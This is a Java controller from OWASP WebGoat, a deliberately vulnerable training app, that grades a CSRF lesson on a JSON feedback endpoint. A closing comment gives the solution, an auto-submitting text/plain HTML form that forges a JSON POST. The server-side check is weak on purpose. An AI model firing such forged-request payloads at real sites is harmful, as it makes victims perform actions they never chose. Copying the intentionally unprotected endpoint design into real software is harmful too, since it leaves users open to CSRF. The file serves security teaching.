/*
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details, please see http://www.owasp.org/
 *
 * Copyright (c) 2002 - 2019 Bruce Mayhew
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 *
 * Getting Source ==============
 *
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software projects.
 */

package org.owasp.webgoat.csrf;

import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.exception.ExceptionUtils;
import org.owasp.webgoat.assignments.AssignmentEndpoint;
import org.owasp.webgoat.assignments.AssignmentHints;
import org.owasp.webgoat.assignments.AssignmentPath;
import org.owasp.webgoat.assignments.AttackResult;
import org.owasp.webgoat.session.UserSessionData;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.util.Map;
import java.util.UUID;

/**
 * @author nbaars
 * @since 11/17/17.
 */
@RestController
@AssignmentHints({"csrf-feedback-hint1", "csrf-feedback-hint2", "csrf-feedback-hint3"})
public class CSRFFeedback extends AssignmentEndpoint {

    @Autowired
    private UserSessionData userSessionData;
    @Autowired
    private ObjectMapper objectMapper;

    @PostMapping(value = "/csrf/feedback/message", produces = {"application/json"})
    @ResponseBody
    public AttackResult completed(HttpServletRequest request, @RequestBody String feedback) {
        try {
            objectMapper.enable(DeserializationFeature.FAIL_ON_IGNORED_PROPERTIES);
            objectMapper.enable(DeserializationFeature.FAIL_ON_NULL_FOR_PRIMITIVES);
            objectMapper.enable(DeserializationFeature.FAIL_ON_NUMBERS_FOR_ENUMS);
            objectMapper.enable(DeserializationFeature.FAIL_ON_READING_DUP_TREE_KEY);
            objectMapper.enable(DeserializationFeature.FAIL_ON_MISSING_CREATOR_PROPERTIES);
            objectMapper.enable(DeserializationFeature.FAIL_ON_TRAILING_TOKENS);
            objectMapper.readValue(feedback.getBytes(), Map.class);
        } catch (IOException e) {
            return failed().feedback(ExceptionUtils.getStackTrace(e)).build();
        }
        boolean correctCSRF = requestContainsWebGoatCookie(request.getCookies()) && request.getContentType().contains(MediaType.TEXT_PLAIN_VALUE);
        correctCSRF &= hostOrRefererDifferentHost(request);
        if (correctCSRF) {
            String flag = UUID.randomUUID().toString();
            userSessionData.setValue("csrf-feedback", flag);
            return success().feedback("csrf-feedback-success").feedbackArgs(flag).build();
        }
        return failed().build();
    }

    @PostMapping(path = "/csrf/feedback", produces = "application/json")
    @ResponseBody
    public AttackResult flag(@RequestParam("confirmFlagVal") String flag) {
        if (flag.equals(userSessionData.getValue("csrf-feedback"))) {
            return trackProgress(success().build());
        } else {
            return trackProgress(failed().build());
        }
    }

    private boolean hostOrRefererDifferentHost(HttpServletRequest request) {
        String referer = request.getHeader("Referer");
        String host = request.getHeader("Host");
        if (referer != null) {
            return !referer.contains(host);
        } else {
            return true;
        }
    }

    private boolean requestContainsWebGoatCookie(Cookie[] cookies) {
        if (cookies != null) {
            for (Cookie c : cookies) {
                if (c.getName().equals("JSESSIONID")) {
                    return true;
                }
            }
        }
        return false;
    }

    /** Solution
     <form name="attack" enctype="text/plain" action="http://localhost:8080/WebGoat/csrf/feedback/message" METHOD="POST">
     <input type="hidden" name='{"name": "Test", "email": "test1233@dfssdf.de", "subject": "service", "message":"dsaffd"}'>
     </form>
     <script>document.attack.submit();</script>
     */
}
